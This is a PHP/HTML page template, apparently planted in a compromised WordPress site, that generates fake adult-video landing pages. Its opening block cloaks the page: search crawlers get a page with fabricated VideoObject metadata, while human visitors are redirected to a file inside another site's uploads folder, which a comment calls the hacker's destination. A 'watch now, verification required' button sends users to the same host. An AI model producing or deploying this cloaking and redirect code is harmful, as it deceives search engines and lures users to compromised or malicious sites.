<?php
// ===================================================================
// BAGIAN 1: PERSIAPAN DATA DINAMIS & LOGIKA INTI
// ===================================================================

// --- Cloaking (Wajib ada di paling atas) ---
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    // Daftar bot yang lebih lengkap
    if (!preg_match('/google|bing|yandex|baidu|ahrefs|semrush|duckduck|bot|spider|crawler/i', $user_agent)) {
        // URL redirect tujuan akhir si peretas
        header('Location: https://www.sookeregionchamber.com/wp-content/uploads/2021/03/blck/index.php?search=jav');
        exit;
    }
}

// --- Membuat Variabel Dasar ---
// Variabel $title dan $additional_content sudah disediakan oleh plugin utama kita saat mengeksekusi template ini.
$canonical = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$page_title_human_readable = ucwords(str_replace('-', ' ', $title));

// --- Membuat Warna Aksen Acak dari Palet Terpilih ---
$bright_colors_palette = [
    '#34D399', // Hijau Emerald
    '#F97316', // Oranye
    '#8B5CF6', // Ungu Violet
    '#3B82F6', // Biru
    '#F59E0B', // Kuning Amber
    '#EC4899'  // Pink Fuchsia
];
$accent_color = $bright_colors_palette[array_rand($bright_colors_palette)];


// --- Membuat Data Video Palsu yang Dinamis ---
$upload_date = date('c', mt_rand(strtotime('-2 year'), time())); // Tanggal upload acak
$duration = 'PT' . mt_rand(2, 25) . 'M' . mt_rand(10, 59) . 'S';  // Durasi acak
$thumbnail_url = 'https://source.unsplash.com/1280x720/?' . urlencode(str_replace('-', ',', $title)); // Thumbnail otomatis
$video_content_url = $canonical . 'video.mp4'; // URL video palsu
$embed_url = str_replace('/videoz/', '/embed/', $canonical); // URL embed palsu

// --- Menyiapkan URL Tujuan Akhir untuk Tombol CTA ---
$final_redirect_url = 'https://www.sookeregionchamber.com/wp-content/uploads/2021/03/blck/index.php?q=' . urlencode($title);

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title><?php echo $page_title_human_readable; ?></title>
    <meta name="description" content="<?php echo htmlspecialchars($additional_content); ?>">
    <link rel="canonical" href="<?php echo $canonical; ?>">
    
    <link rel="amphtml" href="https://p0rnx.free.nf/amp/?page=<?php echo urlencode(strtoupper($title)); ?>">

    <meta property="og:title" content="<?php echo $page_title_human_readable; ?>">
    <meta property="og:description" content="<?php echo htmlspecialchars($additional_content); ?>">
    <meta property="og:image" content="<?php echo $thumbnail_url; ?>">
    <meta property="og:url" content="<?php echo $canonical; ?>">
    <meta property="og:type" content="video.other">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="<?php echo $page_title_human_readable; ?>">
    <meta name="twitter:description" content="<?php echo htmlspecialchars($additional_content); ?>">
    <meta name="twitter:image" content="<?php echo $thumbnail_url; ?>">

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "VideoObject",
      "name": "<?php echo $page_title_human_readable; ?>",
      "description": "<?php echo htmlspecialchars($additional_content); ?>",
      "thumbnailUrl": "<?php echo $thumbnail_url; ?>",
      "uploadDate": "<?php echo $upload_date; ?>",
      "duration": "<?php echo $duration; ?>",
      "contentUrl": "<?php echo $video_content_url; ?>",
      "embedUrl": "<?php echo $embed_url; ?>",
      "publisher": { "@type": "Organization", "name": "Your Site Name" }
    }
    </script>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #111827; }
		.cta-button {
			background-color: <?php echo $accent_color; ?>;
			color: white; /* Pastikan teks tombol selalu putih */
			border: none; /* Hapus border agar lebih bersih */
		}
		.cta-button:hover {
			filter: brightness(1.1); /* Membuat warna sedikit lebih cerah saat disentuh mouse */
		}
    </style>
</head>
<body class="bg-gray-900 text-gray-300">

    <main class="container mx-auto p-4 md:p-8">
        <h1 class="text-3xl md:text-4xl font-bold text-white text-center mb-6">
            <?php echo $page_title_human_readable; ?>
        </h1>

        <section id="media-player" class="max-w-4xl mx-auto bg-black rounded-lg overflow-hidden shadow-2xl shadow-indigo-500/10 mb-6">
            <div class="aspect-w-16 aspect-h-9">
                <video class="w-full h-full object-cover" controls poster="<?php echo $thumbnail_url; ?>">
                    <source src="<?php echo $video_content_url; ?>" type="video/mp4">
                    Browser Anda tidak mendukung tag video.
                </video>
            </div>
        </section>

        <section id="call-to-action" class="max-w-3xl mx-auto text-center my-10">
            <a href="<?php echo $final_redirect_url; ?>" rel="nofollow" class="cta-button inline-block text-white font-bold text-lg px-8 py-4 rounded-full shadow-lg hover:opacity-80 transition-transform transform hover:scale-105">
                â–º NONTON SEKARANG (KUALITAS HD)
            </a>
            <p class="text-gray-500 mt-4">Diperlukan verifikasi untuk melanjutkan.</p>
        </section>
        
        <section id="deskripsi" class="max-w-3xl mx-auto text-gray-400 leading-relaxed mb-12">
            <h2 class="text-xl font-semibold text-white mb-3">Deskripsi</h2>
            <p><?php echo htmlspecialchars($additional_content); ?></p>
        </section>

        <section id="related-videos">
             <h2 class="text-2xl font-semibold text-white mb-6">Video Terkait Lainnya</h2>
             <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
                <?php
                $json_url_internal = get_option('ce_json_content_url');
                if ($json_url_internal) {
                    $json_content_internal = @file_get_contents($json_url_internal);
                    if ($json_content_internal) {
                        $all_data_internal = json_decode($json_content_internal, true);
                        if ($all_data_internal && json_last_error() === JSON_ERROR_NONE) {
                            $all_keywords = array_keys($all_data_internal);
                            shuffle($all_keywords);
                            $related_keywords = array_slice($all_keywords, 0, 5); // Ambil 5 video terkait
                            
                            foreach ($related_keywords as $related_keyword) {
                                if (sanitize_title($related_keyword) === sanitize_title($title)) continue;
                                $related_slug = sanitize_title($related_keyword);
                                $related_url = home_url('/videoz/' . $related_slug . '/');
                                $related_title = ucwords(str_replace('-', ' ', $related_keyword));
                                $related_thumbnail = 'https://source.unsplash.com/400x225/?' . urlencode(str_replace('-', ',', $related_keyword));
                                ?>
                                <a href="<?php echo esc_url($related_url); ?>" class="block bg-gray-800 rounded-lg overflow-hidden group transform hover:-translate-y-1 transition-transform duration-300">
                                    <img src="<?php echo $related_thumbnail; ?>" alt="<?php echo htmlspecialchars($related_title); ?>" class="w-full h-32 object-cover group-hover:opacity-80 transition-opacity">
                                    <div class="p-3">
                                        <h3 class="font-semibold text-sm text-white truncate"><?php echo htmlspecialchars($related_title); ?></h3>
                                    </div>
                                </a>
                                <?php
                            }
                        }
                    }
                }
                ?>
             </div>
        </section>
    </main>
</body>
</html>
